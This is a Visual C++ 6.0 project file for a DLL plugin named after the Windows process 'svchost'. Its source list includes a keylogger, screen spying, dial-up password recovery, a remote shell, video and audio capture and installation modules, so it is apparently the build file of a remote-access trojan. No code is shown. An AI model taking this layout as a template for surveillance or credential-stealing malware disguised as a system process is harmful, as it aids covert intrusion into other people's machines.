# Microsoft Developer Studio Project File - Name="svchost" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=SVCHOST - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "svchost.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "svchost.mak" CFG="SVCHOST - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "svchost - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MD /w /W0 /GX /O2 /I "../../common" /D "WIN32" /D "NDEBUG" /D "_MBCS" /D "_DLL" /YX /FD /c
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ../../common/zlib/zlib.lib Shlwapi.lib MSVCRT.LIB /dll /pdb:"Release/Sunley.pdb" /machine:I386 /out:"../../Bin/Plugins/Consys21.dll"
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "svchost - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;csvchost;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\..\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\common\AudioManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\ClientSocket.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Dialupass.cpp
# End Source File
# Begin Source File

SOURCE=.\common\FileManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\install.cpp
# End Source File
# Begin Source File

SOURCE=.\common\KernelManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\KeyboardManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Manager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegEditEx.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegeditOpt.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Registry.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ScreenManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ScreenSpy.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ServersManagement.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ServersManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ShellManager.cpp
# End Source File
# Begin Source File

SOURCE=.\svchost.cpp
# End Source File
# Begin Source File

SOURCE=.\svchost.rc
# End Source File
# Begin Source File

SOURCE=.\common\SysInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\common\SystemManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\until.cpp
# End Source File
# Begin Source File

SOURCE=.\common\VideoCap.cpp
# End Source File
# Begin Source File

SOURCE=.\common\VideoManager.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hsvchost;hm;inl"
# Begin Source File

SOURCE=..\..\common\Audio.h
# End Source File
# Begin Source File

SOURCE=.\common\AudioManager.h
# End Source File
# Begin Source File

SOURCE=.\common\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\ClientSocket.h
# End Source File
# Begin Source File

SOURCE=.\common\decode.h
# End Source File
# Begin Source File

SOURCE=.\common\Dialupass.h
# End Source File
# Begin Source File

SOURCE=.\common\filemanager.h
# End Source File
# Begin Source File

SOURCE=.\common\KernelManager.h
# End Source File
# Begin Source File

SOURCE=.\common\KeyboardManager.h
# End Source File
# Begin Source File

SOURCE=.\common\keylog.h
# End Source File
# Begin Source File

SOURCE=.\common\login.h
# End Source File
# Begin Source File

SOURCE=.\common\loop.h
# End Source File
# Begin Source File

SOURCE=..\..\common\macros.h
# End Source File
# Begin Source File

SOURCE=.\common\Manager.h
# End Source File
# Begin Source File

SOURCE=.\common\NetUser.h
# End Source File
# Begin Source File

SOURCE=.\common\RegEditEx.h
# End Source File
# Begin Source File

SOURCE=.\common\RegeditOpt.h
# End Source File
# Begin Source File

SOURCE=.\common\Registry.h
# End Source File
# Begin Source File

SOURCE=.\common\RegManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ScreenManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ScreenSpy.h
# End Source File
# Begin Source File

SOURCE=.\common\ServersManagement.h
# End Source File
# Begin Source File

SOURCE=.\common\ServersManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ShellManager.h
# End Source File
# Begin Source File

SOURCE=.\common\SysInfo.h
# End Source File
# Begin Source File

SOURCE=.\common\SystemManager.h
# End Source File
# Begin Source File

SOURCE=.\common\until.h
# End Source File
# Begin Source File

SOURCE=.\common\VideoCap.h
# End Source File
# Begin Source File

SOURCE=..\..\common\VideoCodec.h
# End Source File
# Begin Source File

SOURCE=.\common\VideoManager.h
# End Source File
# Begin Source File

SOURCE=.\Win7.H
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\bitmap1.bmp
# End Source File
# Begin Source File

SOURCE=.\bitmap2.bmp
# End Source File
# Begin Source File

SOURCE=.\bitmap3.bmp
# End Source File
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# End Target
# End Project
